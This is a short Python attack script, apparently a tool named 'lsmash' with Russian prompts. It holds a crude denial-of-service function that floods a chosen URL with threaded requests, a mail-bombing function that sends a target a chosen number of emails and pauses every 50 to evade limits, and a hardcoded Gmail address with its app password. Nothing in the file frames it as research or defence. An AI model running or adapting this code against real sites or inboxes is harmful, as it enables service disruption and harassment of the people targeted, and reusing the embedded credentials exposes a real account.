import requests
import smtplib
import time
import random
from threading import Thread
from colorama import Fore
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def ldos():
    url = str(input('= Сайт: '))
    treads = int(input('= Потоки: '))
    def ddos():
        while(1<10):
            spam = requests.post(url)
            spam2 = requests.get(url)
            for i in range(int(1000)):
                thr = Thread(target = ddos)
                thr.start()
                print(Fore.CYAN + 'lsmash: Атака запущена...')

    ddos()

def cite_response():
	url = str(input('= Сайт: '))
	getting = requests.get(url)
	print(Fore.CYAN + "lsmash: " + str(getting))

def sendmail():
     
    fromaddr = "anonymouselsmash@gmail.com"
    spass = "wimtqkztjbsrolzw"

    toaddr = str(input(Fore.CYAN + "= Кому: "))
    text = str(input(Fore.CYAN + "= Текст: "))

    a,b = fromaddr.split("@")
    g,v = toaddr.split("@")

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "От " + a + "для" + g
     
    body = "Это пробное сообщение"
    msg.attach(MIMEText(body, 'plain'))
     
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, spass)
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

    print()
    print(Fore.CYAN + 'lsmash: Отправленно')
    print()

def spammail():
    stopint = 50
    fromaddr = "anonymouselsmash@gmail.com"
    spass = "wimtqkztjbsrolzw"

    toaddr = str(input(Fore.CYAN + "= Кому: "))
    text = str(input(Fore.CYAN + "= Текст: "))
    spam_s = int(input(Fore.CYAN + "= Количество сообщений: "))

    a,b = fromaddr.split("@")
    g,v = toaddr.split("@")

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "От " + a + "для" + g
     
    body = ""
    msg.attach(MIMEText(body, 'plain'))
    i = 1
    for x in range(spam_s):

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, spass)
        server.sendmail(fromaddr, toaddr, text)
        
        print(Fore.CYAN + 'lsmash: Отправленно ' + str(i) + " сообщение")

        i = i + 1
        if i == stopint:
            time.sleep(60)
            stopint = stopint + 50

    server.quit()